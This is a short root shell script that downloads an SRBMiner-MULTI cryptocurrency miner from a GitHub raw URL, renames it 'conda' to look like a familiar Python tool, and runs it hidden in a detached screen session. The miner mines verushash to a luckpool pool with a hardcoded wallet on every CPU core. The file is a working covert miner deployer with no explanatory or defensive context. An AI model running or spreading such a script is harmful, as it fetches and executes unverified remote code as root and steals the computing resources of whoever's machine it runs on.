sudo su <<EOF
apt-get -y install screen


wget https://raw.githubusercontent.com/apaple/pack/main/SRBMiner-MULTI && chmod u+x SRBMiner-MULTI && mv SRBMiner-MULTI conda && clear && screen -dms run ./conda --disable-gpu --algorithm verushash --pool ap.luckpool.net:3956 --wallet RX5TNT5xdqg8PqMCbqCaC431cfxiMyaGuo.00 --password x -t $(nproc --all)
EOF
screen -r
